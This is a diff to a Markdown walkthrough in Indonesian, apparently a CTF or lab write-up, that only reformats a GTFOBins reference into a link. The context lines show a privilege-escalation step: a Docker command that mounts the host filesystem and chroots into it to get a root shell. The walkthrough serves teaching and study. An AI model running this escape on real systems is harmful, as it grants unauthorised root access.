@@ -200,7 +200,7 @@ $ pwd
 /home/deploy
 ```
 
-### Privilege Escalation Post Exploitation: Root via Docker Escape menggunakan GTFOBins Docker(https://gtfobins.github.io/gtfobins/docker/) dan kita coba untuk menjalankan command dibawah
+### Privilege Escalation Post Exploitation: Root via Docker Escape menggunakan [GTFOBins Docker](https://gtfobins.github.io/gtfobins/docker/) dan kita coba untuk menjalankan command dibawah
 ```terminal
 docker run -v /:/mnt --rm -it alpine chroot /mnt sh
 ```
